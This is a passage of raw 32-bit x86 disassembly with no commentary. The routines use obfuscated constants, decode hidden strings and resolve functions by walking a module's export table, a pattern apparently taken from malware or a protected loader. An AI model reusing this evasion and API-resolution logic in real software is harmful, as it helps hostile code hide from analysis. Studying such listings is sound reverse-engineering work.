  41b709:	cmp    cx,bx
  41b70c:	jne    0x41b711
  41b70e:	mov    DWORD PTR [ebp-0x4],esi
  41b711:	lea    esi,[edx+0x1]
  41b714:	xor    esi,edi
  41b716:	mov    edx,esi
  41b718:	xor    edx,edi
  41b71a:	mov    cx,WORD PTR [eax+edx*2+0x64e5c0]
  41b722:	mov    ebx,0x3b50
  41b727:	sub    cx,bx
  41b72a:	mov    ebx,0x8a8c
  41b72f:	xor    cx,bx
  41b732:	mov    ebx,0x4e3c
  41b737:	cmp    cx,bx
  41b73a:	jne    0x41b704
  41b73c:	cmp    DWORD PTR [ebp-0x4],0xf89c8586
  41b743:	pop    edi
  41b744:	pop    ebx
  41b745:	je     0x41b74c
  41b747:	xor    eax,eax
  41b749:	inc    eax
  41b74a:	jmp    0x41b74e
  41b74c:	xor    eax,eax
  41b74e:	pop    esi
  41b74f:	leave  
  41b750:	ret    
  41b751:	push   ebp
  41b752:	mov    ebp,esp
  41b754:	push   ecx
  41b755:	mov    eax,DWORD PTR [ebp+0x8]
  41b758:	movzx  ecx,WORD PTR [eax]
  41b75b:	push   esi
  41b75c:	lea    eax,[ecx-0x3b50]
  41b762:	mov    esi,0x8a8c
  41b767:	push   edi
  41b768:	xor    eax,esi
  41b76a:	mov    edi,0x4e3c
  41b76f:	mov    DWORD PTR [ebp-0x4],edx
  41b772:	cmp    ax,di
  41b775:	je     0x41b7a2
  41b777:	mov    eax,DWORD PTR [ebp+0x8]
  41b77a:	sub    eax,edx
  41b77c:	mov    DWORD PTR [ebp+0x8],eax
  41b77f:	jmp    0x41b784
  41b781:	mov    eax,DWORD PTR [ebp+0x8]
  41b784:	mov    WORD PTR [edx],cx
  41b787:	add    edx,0x2
  41b78a:	movzx  edi,WORD PTR [eax+edx*1]
  41b78e:	mov    ecx,edi
  41b790:	add    edi,0xffffc4b0
  41b796:	xor    edi,esi
  41b798:	mov    eax,0x4e3c
  41b79d:	cmp    di,ax
  41b7a0:	jne    0x41b781
  41b7a2:	xor    eax,eax
  41b7a4:	pop    edi
  41b7a5:	mov    WORD PTR [edx],ax
  41b7a8:	mov    eax,DWORD PTR [ebp-0x4]
  41b7ab:	pop    esi
  41b7ac:	leave  
  41b7ad:	ret    0x4
  41b7b0:	push   ebp
  41b7b1:	mov    ebp,esp
  41b7b3:	sub    esp,0x18
  41b7b6:	mov    DWORD PTR [ebp-0x14],0xf89c85b9
  41b7bd:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  41b7c4:	mov    eax,DWORD PTR [ebp-0x14]
  41b7c7:	xor    eax,0x7510899
  41b7cc:	add    eax,0x3272e0
  41b7d1:	mov    DWORD PTR [ebp-0x8],eax
  41b7d4:	mov    DWORD PTR [ebp-0x10],0xf89c85b1
  41b7db:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  41b7e2:	mov    DWORD PTR [ebp-0x4],0xf89c85bb
  41b7e9:	mov    eax,DWORD PTR [ebp-0x14]
  41b7ec:	xor    eax,0x7510899
  41b7f1:	mov    ecx,DWORD PTR [ebp-0x8]
  41b7f4:	lea    eax,[ecx+eax*1+0x3272e0]
  41b7fb:	mov    ecx,DWORD PTR [ebp-0x18]
  41b7fe:	xor    ecx,0x7510899
  41b804:	add    ecx,0x3272e0
  41b80a:	mov    edx,DWORD PTR [ebp+0x10]
  41b80d:	imul   edx,ecx
  41b810:	cmp    eax,edx
  41b812:	jae    0x41b905
  41b818:	mov    eax,DWORD PTR [ebp+0x10]
  41b81b:	mov    ecx,DWORD PTR [ebp-0x8]
  41b81e:	sub    eax,ecx
  41b820:	mov    ecx,DWORD PTR [ebp-0x10]
  41b823:	xor    ecx,0x7510899
  41b829:	add    ecx,0x3272e0
  41b82f:	cmp    eax,ecx
  41b831:	jbe    0x41b863
  41b833:	mov    eax,DWORD PTR [ebp+0x8]
  41b836:	add    eax,DWORD PTR [ebp-0x8]
  41b839:	mov    ecx,DWORD PTR [ebp+0xc]
  41b83c:	add    ecx,DWORD PTR [ebp-0x8]
  41b83f:	mov    edx,DWORD PTR [ecx]
  41b841:	mov    DWORD PTR [eax],edx
  41b843:	mov    ecx,DWORD PTR [ecx+0x4]
  41b846:	mov    DWORD PTR [eax+0x4],ecx
  41b849:	mov    eax,DWORD PTR [ebp-0x10]
  41b84c:	xor    eax,0x7510899
  41b851:	mov    ecx,DWORD PTR [ebp-0x8]
  41b854:	lea    eax,[ecx+eax*1+0x3272e0]
  41b85b:	mov    DWORD PTR [ebp-0x8],eax
  41b85e:	jmp    0x41b900
  41b863:	mov    eax,DWORD PTR [ebp+0x10]
  41b866:	mov    ecx,DWORD PTR [ebp-0x8]
  41b869:	sub    eax,ecx
  41b86b:	mov    ecx,DWORD PTR [ebp-0xc]
  41b86e:	xor    ecx,0x7510899
  41b874:	add    ecx,0x3272e0
  41b87a:	cmp    eax,ecx
  41b87c:	jbe    0x41b8a5
  41b87e:	mov    eax,DWORD PTR [ebp+0x8]
  41b881:	add    eax,DWORD PTR [ebp-0x8]
  41b884:	mov    ecx,DWORD PTR [ebp+0xc]
  41b887:	add    ecx,DWORD PTR [ebp-0x8]
  41b88a:	mov    ecx,DWORD PTR [ecx]
  41b88c:	mov    DWORD PTR [eax],ecx
  41b88e:	mov    eax,DWORD PTR [ebp-0xc]
  41b891:	xor    eax,0x7510899
  41b896:	mov    ecx,DWORD PTR [ebp-0x8]
  41b899:	lea    eax,[ecx+eax*1+0x3272e0]
  41b8a0:	mov    DWORD PTR [ebp-0x8],eax
  41b8a3:	jmp    0x41b900
  41b8a5:	mov    eax,DWORD PTR [ebp+0x10]
  41b8a8:	mov    ecx,DWORD PTR [ebp-0x8]
  41b8ab:	sub    eax,ecx
  41b8ad:	mov    ecx,DWORD PTR [ebp-0x4]
  41b8b0:	xor    ecx,0x7510899
  41b8b6:	add    ecx,0x3272e0
  41b8bc:	cmp    eax,ecx
  41b8be:	jbe    0x41b8e9
  41b8c0:	mov    eax,DWORD PTR [ebp+0x8]
  41b8c3:	add    eax,DWORD PTR [ebp-0x8]
  41b8c6:	mov    ecx,DWORD PTR [ebp+0xc]
  41b8c9:	add    ecx,DWORD PTR [ebp-0x8]
  41b8cc:	mov    cx,WORD PTR [ecx]
  41b8cf:	mov    WORD PTR [eax],cx
  41b8d2:	mov    eax,DWORD PTR [ebp-0x4]
  41b8d5:	xor    eax,0x7510899
  41b8da:	mov    ecx,DWORD PTR [ebp-0x8]
  41b8dd:	lea    eax,[ecx+eax*1+0x3272e0]
  41b8e4:	mov    DWORD PTR [ebp-0x8],eax
  41b8e7:	jmp    0x41b900
  41b8e9:	mov    eax,DWORD PTR [ebp+0x8]
  41b8ec:	add    eax,DWORD PTR [ebp-0x8]
  41b8ef:	mov    ecx,DWORD PTR [ebp+0xc]
  41b8f2:	add    ecx,DWORD PTR [ebp-0x8]
  41b8f5:	mov    cl,BYTE PTR [ecx]
  41b8f7:	mov    BYTE PTR [eax],cl
  41b8f9:	mov    eax,DWORD PTR [ebp-0x8]
  41b8fc:	inc    eax
  41b8fd:	mov    DWORD PTR [ebp-0x8],eax
  41b900:	jmp    0x41b7e9
  41b905:	leave  
  41b906:	ret    0xc
  41b909:	push   ebp
  41b90a:	mov    ebp,esp
  41b90c:	push   ecx
  41b90d:	push   ecx
  41b90e:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  41b915:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  41b91c:	xor    eax,eax
  41b91e:	inc    eax
  41b91f:	je     0x41b961
  41b921:	mov    eax,DWORD PTR [ebp-0x4]
  41b924:	xor    eax,0x7510899
  41b929:	add    eax,0x3272e0
  41b92e:	cmp    DWORD PTR [ebp+0xc],eax
  41b931:	jne    0x41b935
  41b933:	jmp    0x41b961
  41b935:	mov    eax,DWORD PTR [ebp-0x8]
  41b938:	xor    eax,0x7510899
  41b93d:	add    eax,0x3272e0
  41b942:	mov    ecx,DWORD PTR [ebp+0xc]
  41b945:	sub    ecx,eax
  41b947:	mov    DWORD PTR [ebp+0xc],ecx
  41b94a:	mov    eax,DWORD PTR [ebp-0x4]
  41b94d:	xor    eax,0x7510899
  41b952:	add    eax,0x3272e0
  41b957:	mov    ecx,DWORD PTR [ebp+0x8]
  41b95a:	add    ecx,DWORD PTR [ebp+0xc]
  41b95d:	mov    BYTE PTR [ecx],al
  41b95f:	jmp    0x41b91c
  41b961:	leave  
  41b962:	ret    0x8
  41b965:	push   ebp
  41b966:	mov    ebp,esp
  41b968:	sub    esp,0x21c
  41b96e:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  41b975:	mov    DWORD PTR [ebp-0x14],0xf89c85b8
  41b97c:	mov    eax,DWORD PTR [ebp+0x10]
  41b97f:	mov    eax,DWORD PTR [ebp-0x4]
  41b982:	mov    ecx,DWORD PTR [ebp+0x8]
  41b985:	push   esi
  41b986:	push   edi
  41b987:	mov    edi,0x7510899
  41b98c:	xor    eax,edi
  41b98e:	mov    esi,0x3272e0
  41b993:	add    eax,esi
  41b995:	cmp    eax,ecx
  41b997:	mov    eax,DWORD PTR [ebp-0x4]
  41b99a:	jne    0x41b9a5
  41b99c:	xor    eax,edi
  41b99e:	add    eax,esi
  41b9a0:	jmp    0x41ba51
  41b9a5:	mov    ecx,DWORD PTR [ebp+0xc]
  41b9a8:	xor    eax,edi
  41b9aa:	add    eax,esi
  41b9ac:	cmp    eax,ecx
  41b9ae:	jne    0x41b9b5
  41b9b0:	mov    eax,DWORD PTR [ebp-0x4]
  41b9b3:	jmp    0x41b99c
  41b9b5:	lea    eax,[ebp-0x21c]
  41b9bb:	mov    DWORD PTR [ebp-0x8],eax
  41b9be:	mov    eax,DWORD PTR [ebp+0xc]
  41b9c1:	mov    DWORD PTR [ebp-0x10],eax
  41b9c4:	mov    eax,DWORD PTR [ebp-0x4]
  41b9c7:	xor    eax,edi
  41b9c9:	add    eax,esi
  41b9cb:	mov    DWORD PTR [ebp+0x10],eax
  41b9ce:	mov    eax,DWORD PTR [ebp+0xc]
  41b9d1:	push   ebx
  41b9d2:	call   0x41b6c2
  41b9d7:	mov    ebx,eax
  41b9d9:	mov    eax,DWORD PTR [ebp+0x8]
  41b9dc:	mov    eax,DWORD PTR [eax+0x14]
  41b9df:	jmp    0x41ba39
  41b9e1:	mov    eax,DWORD PTR [ebp+0xc]
  41b9e4:	sub    eax,0x8
  41b9e7:	mov    DWORD PTR [ebp-0xc],eax
  41b9ea:	mov    eax,DWORD PTR [ebp-0xc]
  41b9ed:	mov    eax,DWORD PTR [eax+0x28]
  41b9f0:	call   0x41b5aa
  41b9f5:	mov    DWORD PTR [ebp+0x10],eax
  41b9f8:	push   DWORD PTR [ebp+0x10]
  41b9fb:	mov    edx,DWORD PTR [ebp-0x8]
  41b9fe:	call   0x41b751
  41ba03:	mov    eax,DWORD PTR [ebp-0x4]
  41ba06:	xor    eax,edi
  41ba08:	add    eax,esi
  41ba0a:	cmp    eax,ebx
  41ba0c:	jne    0x41ba16
  41ba0e:	mov    eax,DWORD PTR [ebp-0x8]
  41ba11:	call   0x41b638
  41ba16:	mov    eax,DWORD PTR [ebp-0x14]
  41ba19:	xor    eax,edi
  41ba1b:	add    eax,esi
  41ba1d:	push   eax
  41ba1e:	push   DWORD PTR [ebp-0x10]
  41ba21:	push   DWORD PTR [ebp-0x8]
  41ba24:	call   0x41b33c
  41ba29:	mov    ecx,DWORD PTR [ebp-0x4]
  41ba2c:	xor    ecx,edi
  41ba2e:	add    ecx,esi
  41ba30:	cmp    eax,ecx
  41ba32:	je     0x41ba57
  41ba34:	mov    eax,DWORD PTR [ebp+0xc]
  41ba37:	mov    eax,DWORD PTR [eax]
  41ba39:	mov    DWORD PTR [ebp+0xc],eax
  41ba3c:	mov    eax,DWORD PTR [ebp+0x8]
  41ba3f:	mov    ecx,DWORD PTR [ebp+0xc]
  41ba42:	add    eax,0x14
  41ba45:	cmp    ecx,eax
  41ba47:	jne    0x41b9e1
  41ba49:	mov    eax,DWORD PTR [ebp-0x4]
  41ba4c:	xor    eax,edi
  41ba4e:	add    eax,esi
  41ba50:	pop    ebx
  41ba51:	pop    edi
  41ba52:	pop    esi
  41ba53:	leave  
  41ba54:	ret    0xc
  41ba57:	mov    eax,DWORD PTR [ebp-0xc]
  41ba5a:	mov    eax,DWORD PTR [eax+0x18]
  41ba5d:	jmp    0x41ba50
  41ba5f:	push   ebp
  41ba60:	mov    ebp,esp
  41ba62:	mov    eax,DWORD PTR [ebp+0xc]
  41ba65:	sub    esp,0x10
  41ba68:	cmp    DWORD PTR [ebp+0x8],0x0
  41ba6c:	push   ebx
  41ba6d:	push   esi
  41ba6e:	push   edi
  41ba6f:	je     0x41bb24
  41ba75:	test   eax,eax
  41ba77:	je     0x41bb24
  41ba7d:	movzx  eax,WORD PTR [eax+0x20]
  41ba81:	mov    ecx,eax
  41ba83:	mov    DWORD PTR [ebp-0x10],eax
  41ba86:	xor    edx,edx
  41ba88:	and    DWORD PTR [ebp-0x8],edx
  41ba8b:	mov    eax,0x8a8c
  41ba90:	xor    ecx,eax
  41ba92:	add    ecx,0x3b50
  41ba98:	mov    DWORD PTR [ebp-0xc],ecx
  41ba9b:	and    DWORD PTR [ebp-0x4],0x0
  41ba9f:	xor    ecx,ecx
  41baa1:	push   0x78
  41baa3:	pop    edi
  41baa4:	cmp    cx,WORD PTR [ebp-0xc]
  41baa8:	jae    0x41bb0e
  41baaa:	lea    esi,[edx-0x3b50]
  41bab0:	xor    esi,eax
  41bab2:	movzx  ecx,WORD PTR [ebp-0x4]
  41bab6:	mov    ebx,DWORD PTR [ebp+0xc]
  41bab9:	lea    ecx,[ebx+ecx*4]
  41babc:	cmp    WORD PTR [ecx+0x2],si
  41bac0:	jne    0x41baf9
  41bac2:	movzx  ecx,WORD PTR [ecx]
  41bac5:	mov    edi,0x4e3c
  41baca:	cmp    cx,di
  41bacd:	jne    0x41badb
  41bacf:	mov    ebx,DWORD PTR [ebp+0x8]
  41bad2:	movzx  edi,dx
  41bad5:	cmp    BYTE PTR [edi+ebx*1],0x0
  41bad9:	je     0x41bb08
  41badb:	mov    ebx,DWORD PTR [ebp+0x8]
  41bade:	movzx  edi,dx
  41bae1:	movsx  di,BYTE PTR [edi+ebx*1]
  41bae6:	mov    ebx,0x3b50
  41baeb:	sub    di,bx
  41baee:	xor    di,ax
  41baf1:	cmp    cx,di
  41baf4:	je     0x41bb08
  41baf6:	push   0x7a
  41baf8:	pop    edi
  41baf9:	inc    DWORD PTR [ebp-0x4]
  41bafc:	mov    cx,WORD PTR [ebp-0xc]
  41bb00:	cmp    WORD PTR [ebp-0x4],cx
  41bb04:	jb     0x41bab2
  41bb06:	jmp    0x41bb0e
  41bb08:	inc    DWORD PTR [ebp-0x8]
  41bb0b:	push   0x79
  41bb0d:	pop    edi
  41bb0e:	mov    esi,DWORD PTR [ebp+0x8]
  41bb11:	movzx  ecx,dx
  41bb14:	cmp    BYTE PTR [ecx+esi*1],0x0
  41bb18:	je     0x41bb2d
  41bb1a:	inc    edx
  41bb1b:	cmp    edi,0x7a
  41bb1e:	jne    0x41ba9b
  41bb24:	xor    eax,eax
  41bb26:	pop    edi
  41bb27:	pop    esi
  41bb28:	pop    ebx
  41bb29:	leave  
  41bb2a:	ret    0x8
  41bb2d:	mov    ecx,DWORD PTR [ebp-0x8]
  41bb30:	add    ecx,0xffffc4b0
  41bb36:	xor    cx,ax
  41bb39:	xor    eax,eax
  41bb3b:	cmp    cx,WORD PTR [ebp-0x10]
  41bb3f:	sete   al
  41bb42:	jmp    0x41bb26
  41bb44:	push   ebp
  41bb45:	mov    ebp,esp
  41bb47:	sub    esp,0x50
  41bb4a:	push   edi
  41bb4b:	mov    edi,eax
  41bb4d:	mov    eax,DWORD PTR [edi+0x1a8]
  41bb53:	cmp    DWORD PTR [eax],0x0
  41bb56:	jne    0x41bb5f
  41bb58:	xor    eax,eax
  41bb5a:	jmp    0x41bc8f
  41bb5f:	push   0x2c
  41bb61:	push   DWORD PTR [ebp+0x8]
  41bb64:	call   0x41b909
  41bb69:	mov    edx,DWORD PTR [edi+0x1ac]
  41bb6f:	lea    eax,[edi+0x22]
  41bb72:	mov    DWORD PTR [ebp-0x4c],eax
  41bb75:	lea    eax,[edi+0x44]
  41bb78:	mov    DWORD PTR [ebp-0x48],eax
  41bb7b:	lea    eax,[edi+0x66]
  41bb7e:	mov    DWORD PTR [ebp-0x44],eax
  41bb81:	lea    eax,[edi+0x88]
  41bb87:	mov    DWORD PTR [ebp-0x40],eax
  41bb8a:	lea    eax,[edi+0xaa]
  41bb90:	mov    DWORD PTR [ebp-0x3c],eax
  41bb93:	lea    eax,[edi+0xcc]
  41bb99:	mov    DWORD PTR [ebp-0x38],eax
  41bb9c:	lea    eax,[edi+0xee]
  41bba2:	mov    DWORD PTR [ebp-0x34],eax
  41bba5:	lea    eax,[edi+0x110]
  41bbab:	mov    DWORD PTR [ebp-0x30],eax
  41bbae:	lea    eax,[edi+0x132]
  41bbb4:	mov    DWORD PTR [ebp-0x2c],eax
  41bbb7:	lea    eax,[edi+0x154]
  41bbbd:	push   edi
  41bbbe:	mov    DWORD PTR [ebp-0x50],edi
  41bbc1:	mov    DWORD PTR [ebp-0x28],eax
  41bbc4:	call   0x41bcc3
  41bbc9:	push   eax
  41bbca:	mov    eax,DWORD PTR [edi+0x1a8]
  41bbd0:	push   DWORD PTR [eax]
  41bbd2:	call   0x41b965
  41bbd7:	mov    DWORD PTR [ebp-0x10],eax
  41bbda:	test   eax,eax
  41bbdc:	je     0x41bc8f
  41bbe2:	mov    ecx,DWORD PTR [eax+0x3c]
  41bbe5:	push   ebx
  41bbe6:	push   esi
  41bbe7:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  41bbeb:	add    esi,eax
  41bbed:	mov    edi,DWORD PTR [esi+0x24]
  41bbf0:	mov    ecx,DWORD PTR [esi+0x1c]
  41bbf3:	mov    edx,DWORD PTR [esi+0x20]
  41bbf6:	mov    ebx,DWORD PTR [esi+0x18]
  41bbf9:	add    edi,eax
  41bbfb:	mov    DWORD PTR [ebp-0x20],edi
  41bbfe:	mov    edi,DWORD PTR [esi+0x14]
  41bc01:	add    ecx,eax
  41bc03:	add    edx,eax
  41bc05:	mov    DWORD PTR [ebp-0xc],ecx
  41bc08:	mov    DWORD PTR [ebp-0x1c],edx
  41bc0b:	mov    DWORD PTR [ebp-0x8],edi
  41bc0e:	cmp    edi,ebx
  41bc10:	ja     0x41bc15
  41bc12:	mov    DWORD PTR [ebp-0x8],ebx
  41bc15:	xor    ebx,ebx
  41bc17:	mov    DWORD PTR [ebp-0x18],ebx
  41bc1a:	cmp    DWORD PTR [ebp-0x8],ebx
  41bc1d:	jbe    0x41bc8d
  41bc1f:	jmp    0x41bc24
  41bc21:	mov    edx,DWORD PTR [ebp-0x1c]
  41bc24:	mov    edi,DWORD PTR [ebp-0x20]
  41bc27:	movzx  edi,WORD PTR [edi+ebx*2]
  41bc2b:	cmp    ebx,DWORD PTR [esi+0x18]
  41bc2e:	jae    0x41bc8d
  41bc30:	cmp    edi,DWORD PTR [esi+0x14]
  41bc33:	jae    0x41bc8d
  41bc35:	mov    ebx,DWORD PTR [edx+ebx*4]
  41bc38:	mov    edx,DWORD PTR [ebp+0x8]
  41bc3b:	mov    edi,DWORD PTR [ecx+edi*4]
  41bc3e:	mov    DWORD PTR [ebp-0x4],edx
  41bc41:	lea    edx,[ebp-0x50]
  41bc44:	add    ebx,eax
  41bc46:	add    edi,eax
  41bc48:	sub    edx,DWORD PTR [ebp+0x8]
  41bc4b:	mov    DWORD PTR [ebp-0x14],0xb
  41bc52:	mov    DWORD PTR [ebp-0x24],edx
  41bc55:	mov    edx,DWORD PTR [ebp-0x4]
  41bc58:	cmp    DWORD PTR [edx],0x0
  41bc5b:	jne    0x41bc78
  41bc5d:	mov    eax,DWORD PTR [ebp-0x24]
  41bc60:	push   DWORD PTR [eax+edx*1]
  41bc63:	push   ebx
  41bc64:	call   0x41ba5f
  41bc69:	mov    ecx,DWORD PTR [ebp-0xc]
  41bc6c:	test   eax,eax
  41bc6e:	je     0x41bc75
  41bc70:	mov    eax,DWORD PTR [ebp-0x4]
  41bc73:	mov    DWORD PTR [eax],edi
  41bc75:	mov    eax,DWORD PTR [ebp-0x10]
  41bc78:	add    DWORD PTR [ebp-0x4],0x4
  41bc7c:	dec    DWORD PTR [ebp-0x14]
  41bc7f:	jne    0x41bc55
  41bc81:	mov    ebx,DWORD PTR [ebp-0x18]
  41bc84:	inc    ebx
  41bc85:	mov    DWORD PTR [ebp-0x18],ebx
  41bc88:	cmp    ebx,DWORD PTR [ebp-0x8]
  41bc8b:	jb     0x41bc21
  41bc8d:	pop    esi
  41bc8e:	pop    ebx
  41bc8f:	pop    edi
  41bc90:	leave  
  41bc91:	ret    0x4
  41bc94:	push   ebp
  41bc95:	mov    ebp,esp
  41bc97:	mov    eax,DWORD PTR [ebp+0x8]
  41bc9a:	push   esi
  41bc9b:	push   DWORD PTR [eax+0x1d8]
  41bca1:	lea    esi,[eax+0x198]
  41bca7:	mov    eax,DWORD PTR [ebp+0x8]
  41bcaa:	call   0x41bb44
  41bcaf:	mov    ecx,DWORD PTR [esi]
  41bcb1:	mov    DWORD PTR [ecx],eax
  41bcb3:	mov    eax,DWORD PTR [esi]
  41bcb5:	xor    ecx,ecx
  41bcb7:	cmp    DWORD PTR [eax],ecx
  41bcb9:	pop    esi
  41bcba:	setne  cl
  41bcbd:	mov    eax,ecx
  41bcbf:	pop    ebp
  41bcc0:	ret    0x4
  41bcc3:	mov    ecx,DWORD PTR [edi+0x188]
  41bcc9:	push   ebx
  41bcca:	jmp    0x41bcdf
  41bccc:	xor    eax,0x8a8c
  41bcd1:	add    eax,0x3b50
  41bcd6:	mov    WORD PTR [ecx],ax
  41bcd9:	add    ecx,0x2
  41bcdc:	add    edx,0x2
  41bcdf:	movzx  eax,WORD PTR [edx]
  41bce2:	mov    ebx,0x4e3c
  41bce7:	cmp    ax,bx
  41bcea:	jne    0x41bccc
  41bcec:	xor    eax,eax
  41bcee:	mov    WORD PTR [ecx],ax
  41bcf1:	mov    eax,DWORD PTR [edi+0x188]
  41bcf7:	pop    ebx
  41bcf8:	ret    
  41bcf9:	push   edi
  41bcfa:	mov    edi,eax
  41bcfc:	mov    eax,DWORD PTR [esi+0x188]
  41bd02:	shl    edi,0x6
  41bd05:	add    eax,edi
  41bd07:	jmp    0x41bd13
  41bd09:	xor    cl,0x73
  41bd0c:	sub    cl,0x9
  41bd0f:	mov    BYTE PTR [eax],cl
  41bd11:	inc    eax
  41bd12:	inc    edx
  41bd13:	mov    cl,BYTE PTR [edx]
  41bd15:	cmp    cl,0x7a
  41bd18:	jne    0x41bd09
  41bd1a:	mov    BYTE PTR [eax],0x0
  41bd1d:	mov    eax,DWORD PTR [esi+0x188]
  41bd23:	add    eax,edi
  41bd25:	pop    edi
  41bd26:	ret    
  41bd27:	push   ebp
  41bd28:	mov    ebp,esp
  41bd2a:	sub    esp,0x38
  41bd2d:	push   ebx
  41bd2e:	mov    ebx,0xf89c85b9
  41bd33:	mov    DWORD PTR [ebp-0x4],ebx
  41bd36:	lea    eax,[ebx-0x1]
  41bd39:	push   esi
  41bd3a:	mov    DWORD PTR [ebp-0x24],eax
  41bd3d:	mov    ecx,DWORD PTR [ebp-0x4]
  41bd40:	mov    edx,DWORD PTR [ebp+0x8]
  41bd43:	mov    esi,0x7510899
  41bd48:	push   edi
  41bd49:	xor    ecx,esi
  41bd4b:	mov    edi,0x3272e0
  41bd50:	add    ecx,edi
  41bd52:	cmp    edx,ecx
  41bd54:	je     0x41bec2
  41bd5a:	mov    ecx,DWORD PTR [ebp-0x4]
  41bd5d:	mov    edx,DWORD PTR [ebp+0xc]
  41bd60:	xor    ecx,esi
  41bd62:	add    ecx,edi
  41bd64:	cmp    edx,ecx
  41bd66:	je     0x41bec2
  41bd6c:	mov    ecx,DWORD PTR [ebp+0x10]
  41bd6f:	mov    DWORD PTR [ebp-0x18],ecx
  41bd72:	mov    ecx,DWORD PTR [ebp+0xc]
  41bd75:	mov    DWORD PTR [ebp-0x14],ecx
  41bd78:	mov    ecx,DWORD PTR [ebp+0x8]
  41bd7b:	mov    DWORD PTR [ebp-0x1c],0xf89c8504
  41bd82:	mov    DWORD PTR [ebp-0x20],eax
  41bd85:	mov    DWORD PTR [ebp-0x10],ebx
  41bd88:	mov    DWORD PTR [ebp+0xc],eax
  41bd8b:	mov    DWORD PTR [ebp+0x10],0xf89c85bb
  41bd92:	mov    eax,DWORD PTR [ebp+0xc]
  41bd95:	mov    DWORD PTR [ebp-0xc],ecx
  41bd98:	xor    eax,esi
  41bd9a:	mov    ecx,0xffcd8d20
  41bd9f:	sub    ecx,eax
  41bda1:	add    ecx,DWORD PTR [ebp-0x14]
  41bda4:	mov    DWORD PTR [ebp+0x8],ecx
  41bda7:	mov    DWORD PTR [ebp-0x8],0xf89c85bc
  41bdae:	jmp    0x41beb2
  41bdb3:	mov    eax,DWORD PTR [ebp+0xc]
  41bdb6:	mov    ecx,DWORD PTR [ebp+0xc]
  41bdb9:	xor    eax,esi
  41bdbb:	xor    ecx,esi
  41bdbd:	lea    ecx,[eax+ecx*1+0x64e5c0]
  41bdc4:	mov    eax,DWORD PTR [ebp+0x8]
  41bdc7:	xor    edx,edx
  41bdc9:	div    ecx
  41bdcb:	mov    eax,DWORD PTR [ebp+0x10]
  41bdce:	mov    ecx,DWORD PTR [ebp+0xc]
  41bdd1:	xor    eax,esi
  41bdd3:	xor    ecx,esi
  41bdd5:	sub    eax,ecx
  41bdd7:	cmp    edx,eax
  41bdd9:	jne    0x41be6e
  41bddf:	mov    eax,DWORD PTR [ebp+0x8]
  41bde2:	add    eax,DWORD PTR [ebp-0xc]
  41bde5:	mov    dl,BYTE PTR [eax]
  41bde7:	mov    eax,DWORD PTR [ebp-0x10]
  41bdea:	mov    ecx,DWORD PTR [ebp-0x8]
  41bded:	xor    eax,esi
  41bdef:	xor    ecx,esi
  41bdf1:	add    eax,edi
  41bdf3:	add    ecx,edi
  41bdf5:	cmp    eax,ecx
  41bdf7:	jae    0x41be3f
  41bdf9:	lea    ecx,[eax-0x3272e0]
  41bdff:	mov    DWORD PTR [ebp-0x4],ecx
  41be02:	mov    ebx,DWORD PTR [ebp-0x4]
  41be05:	xor    ebx,esi
  41be07:	add    ebx,0x7f55d8fb
  41be0d:	lea    ecx,[ebp+eax*4-0x38]
  41be11:	mov    DWORD PTR [ecx],ebx
  41be13:	mov    ebx,DWORD PTR [ecx]
  41be15:	cmp    ebx,0x244ecbda
  41be1b:	jbe    0x41be25
  41be1d:	add    DWORD PTR [ecx],0x405fc1d
  41be23:	jmp    0x41be2b
  41be25:	add    DWORD PTR [ecx],0xfdaf43e3
  41be2b:	mov    ecx,DWORD PTR [ebp-0x8]
  41be2e:	xor    ecx,esi
  41be30:	inc    eax
  41be31:	inc    DWORD PTR [ebp-0x4]
  41be34:	add    ecx,edi
  41be36:	cmp    eax,ecx
  41be38:	jb     0x41be02
  41be3a:	mov    ebx,0xf89c85b9
  41be3f:	mov    eax,DWORD PTR [ebp-0x18]
  41be42:	test   eax,eax
  41be44:	jne    0x41be4e
  41be46:	xor    dl,0x73
  41be49:	sub    dl,0x9
  41be4c:	jmp    0x41be64
  41be4e:	mov    eax,DWORD PTR [ebp-0x1c]
  41be51:	xor    al,0x99
  41be53:	mov    cl,0x20
  41be55:	sub    cl,al
  41be57:	add    dl,cl
  41be59:	mov    ecx,DWORD PTR [ebp-0x20]
  41be5c:	xor    cl,0x99
  41be5f:	sub    cl,0x20
  41be62:	ror    dl,cl
  41be64:	xor    eax,eax
  41be66:	mov    eax,DWORD PTR [ebp+0x8]
  41be69:	add    eax,DWORD PTR [ebp-0xc]
  41be6c:	mov    BYTE PTR [eax],dl
  41be6e:	mov    eax,DWORD PTR [ebp+0x8]
  41be71:	mov    ecx,DWORD PTR [ebp-0x10]
  41be74:	sub    eax,edi
  41be76:	xor    eax,esi
  41be78:	cmp    eax,ecx
  41be7a:	jne    0x41bea0
  41be7c:	mov    eax,DWORD PTR [ebp+0x10]
  41be7f:	mov    ecx,DWORD PTR [ebp+0xc]
  41be82:	xor    eax,esi
  41be84:	xor    ecx,esi
  41be86:	sub    eax,ecx
  41be88:	sub    eax,edi
  41be8a:	xor    eax,esi
  41be8c:	mov    DWORD PTR [ebp+0x10],eax
  41be8f:	mov    eax,DWORD PTR [ebp+0xc]
  41be92:	xor    eax,esi
  41be94:	mov    ecx,0xffcd8d20
  41be99:	sub    ecx,eax
  41be9b:	add    ecx,DWORD PTR [ebp-0x14]
  41be9e:	jmp    0x41beaf
  41bea0:	mov    eax,DWORD PTR [ebp+0xc]
  41bea3:	xor    eax,esi
  41bea5:	mov    ecx,0xffcd8d20
  41beaa:	sub    ecx,eax
  41beac:	add    ecx,DWORD PTR [ebp+0x8]
  41beaf:	mov    DWORD PTR [ebp+0x8],ecx
  41beb2:	mov    eax,DWORD PTR [ebp+0x10]
  41beb5:	cmp    eax,ebx
  41beb7:	jne    0x41bdb3
  41bebd:	mov    eax,DWORD PTR [ebp-0x24]
  41bec0:	jmp    0x41bec5
  41bec2:	mov    eax,DWORD PTR [ebp-0x4]
  41bec5:	xor    eax,esi
  41bec7:	add    eax,edi
  41bec9:	pop    edi
  41beca:	pop    esi
  41becb:	pop    ebx
  41becc:	leave  
  41becd:	ret    0xc
  41bed0:	push   ebp
  41bed1:	mov    ebp,esp
  41bed3:	sub    esp,0x14
  41bed6:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  41bedd:	mov    DWORD PTR [ebp-0x4],0xf89c85b8
  41bee4:	mov    eax,DWORD PTR [ebx]
